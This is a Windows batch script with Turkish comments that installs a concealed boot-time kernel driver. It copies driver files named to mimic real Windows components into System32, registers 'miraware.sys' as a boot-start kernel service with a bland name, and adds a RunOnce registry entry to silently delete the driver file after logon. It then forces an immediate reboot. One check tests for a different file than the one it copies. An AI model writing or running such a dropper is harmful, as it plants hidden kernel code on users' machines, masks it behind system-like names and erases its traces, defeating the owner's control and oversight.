@echo off
setlocal

:: Script dizinini ayarla
set "SCRIPT_DIR=%~dp0"
set "system32Dir=C:\Windows\System32"


:: Dosyaları System32'ye kopyala
if exist "%SCRIPT_DIR%devacpi64.sys" (
    copy /y "%SCRIPT_DIR%devacpi64.sys" "%system32Dir%\"
)
if exist "%SCRIPT_DIR%netfwcore.sys" (
    copy /y "%SCRIPT_DIR%miraware.sys" "%system32Dir%\"
)
if exist "%SCRIPT_DIR%sysmonnt.sys" (
    copy /y "%SCRIPT_DIR%sysmonnt.sys" "%system32Dir%\"
)
if exist "%SCRIPT_DIR%usbstorq.sys" (
    copy /y "%SCRIPT_DIR%usbstorq.sys" "%system32Dir%\"
)
if exist "%SCRIPT_DIR%winstorq.sys" (
    copy /y "%SCRIPT_DIR%winstorq.sys" "%system32Dir%\"
)

:: Sürücüyü oluştur (Boot aşamasında yüklenecek)
sc create system2 binPath= "C:\Windows\System32\miraware.sys" DisplayName= "ca2" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1

:: RESTART SONRASI SİLME İŞLEMİ (RunOnce Kaydı)
:: Sistem yeniden açılıp oturum açıldığında miraware.sys dosyasını System32'den sessizce siler.
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "DeleteMirawareSys" /t REG_SZ /d "cmd.exe /c del /f /q C:\Windows\System32\miraware.sys" /f >nul 2>&1

:: Sistemi yeniden başlat
shutdown /r /t 3 /f
